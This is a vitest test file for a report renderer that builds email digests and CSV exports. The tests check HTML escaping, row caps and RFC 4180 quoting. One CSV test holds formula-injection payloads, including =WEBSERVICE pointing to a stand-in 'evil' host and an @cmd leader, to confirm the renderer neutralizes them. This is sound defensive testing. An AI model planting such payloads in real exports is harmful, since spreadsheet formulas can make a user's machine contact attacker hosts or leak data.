import { describe, expect, it } from 'vitest';

import {
  DIGEST_TABLE_MAX_ROWS,
  csvFilename,
  formatCents,
  renderCsv,
  renderDigest,
} from '../lib/reports/render';
import type { ReportResult } from '../lib/reports/types';

const END = new Date(Date.UTC(2026, 7, 21, 7, 15));

const report: ReportResult = {
  reportId: 'revenue-collections',
  title: 'Revenue & collections',
  window: { start: new Date(Date.UTC(2026, 7, 14, 7, 15)), end: END },
  sections: [
    {
      heading: 'Totals (USD)',
      items: [
        { label: 'Billed', value: '120.00 USD' },
        { label: 'Kaçış <testi>', value: 'a & b' },
      ],
    },
  ],
  table: { columns: ['Organization', 'Billed'], rows: [['Şişli Ajans', '120.00']] },
};

describe('renderDigest', () => {
  const digest = renderDigest(report);

  it('subject carries the report name and window label', () => {
    expect(digest.subject).toBe('[Mailmyra] Revenue & collections — 2026-08-14 → 2026-08-21');
  });

  it('is email HTML: table-based, no div, border="0" on every table', () => {
    expect(digest.html).not.toContain('<div');
    expect(digest.html).not.toContain('<style');
    const tables = digest.html.match(/<table/g) ?? [];
    const borders = digest.html.match(/<table border="0"/g) ?? [];
    expect(tables.length).toBeGreaterThan(0);
    expect(borders.length).toBe(tables.length);
  });

  it('escapes user-written values', () => {
    expect(digest.html).toContain('Kaçış &lt;testi&gt;');
    expect(digest.html).toContain('a &amp; b');
    expect(digest.html).toContain('Şişli Ajans');
  });

  it('has a real text fallback', () => {
    expect(digest.text).toContain('Revenue & collections — 2026-08-14 → 2026-08-21');
    expect(digest.text).toContain('Billed: 120.00 USD');
  });

  it('caps the inline table and says how much is hidden — no CSV attached, honest "omitted"', () => {
    const rows = Array.from({ length: DIGEST_TABLE_MAX_ROWS + 5 }, (_, i) => [`org${i}`, '1.00']);
    const html = renderDigest({ ...report, table: { columns: ['O', 'B'], rows } }).html;
    expect(html).toContain(`org${DIGEST_TABLE_MAX_ROWS - 1}`);
    expect(html).not.toContain(`org${DIGEST_TABLE_MAX_ROWS}<`);
    expect(html).toContain('+5 more rows omitted from this digest.');
  });

  it('caps the inline table and points to the CSV when one is attached', () => {
    const rows = Array.from({ length: DIGEST_TABLE_MAX_ROWS + 5 }, (_, i) => [`org${i}`, '1.00']);
    const html = renderDigest(
      { ...report, table: { columns: ['O', 'B'], rows } },
      { csvAttached: true },
    ).html;
    expect(html).toContain('+5 more rows in the CSV attachment.');
    expect(html).not.toContain('omitted from this digest');
  });

  it('uses the singular "row" when exactly one row is hidden', () => {
    const rows = Array.from({ length: DIGEST_TABLE_MAX_ROWS + 1 }, (_, i) => [`org${i}`, '1.00']);
    const html = renderDigest({ ...report, table: { columns: ['O', 'B'], rows } }).html;
    expect(html).toContain('+1 more row omitted from this digest.');
    expect(html).not.toContain('+1 more rows');
  });
});

describe('renderCsv', () => {
  it('quotes commas, quotes and newlines per RFC 4180', () => {
    const csv = renderCsv({
      columns: ['name', 'note'],
      rows: [
        ['Acme, Inc', 'said "hi"'],
        ['Plain', 'multi\nline'],
      ],
    });
    expect(csv).toBe('name,note\r\n"Acme, Inc","said ""hi"""\r\nPlain,"multi\nline"\r\n');
  });

  it('neutralizes formula-injection leaders (=,+,-,@,TAB,CR) with a leading single quote', () => {
    const csv = renderCsv({
      columns: ['a', 'b', 'c', 'd', 'e'],
      rows: [['=WEBSERVICE("http://evil")', '+SUM(1)', '-2', '@cmd', 'safe']],
    });
    expect(csv).toBe(
      'a,b,c,d,e\r\n' + '"\'=WEBSERVICE(""http://evil"")",\'+SUM(1),\'-2,\'@cmd,safe\r\n',
    );
  });

  it('also prefixes a plain negative number — String(v) sees the same leading "-" (documented, acceptable)', () => {
    const csv = renderCsv({ columns: ['n'], rows: [[-2]] });
    expect(csv).toBe("n\r\n'-2\r\n");
  });
});

describe('helpers', () => {
  it('csvFilename uses the UTC day', () => {
    expect(csvFilename('revenue-collections', END)).toBe('revenue-collections-2026-08-21.csv');
  });

  it('formatCents renders decimal + currency', () => {
    expect(formatCents(12345, 'USD')).toBe('123.45 USD');
    expect(formatCents(0, 'TRY')).toBe('0.00 TRY');
  });
});
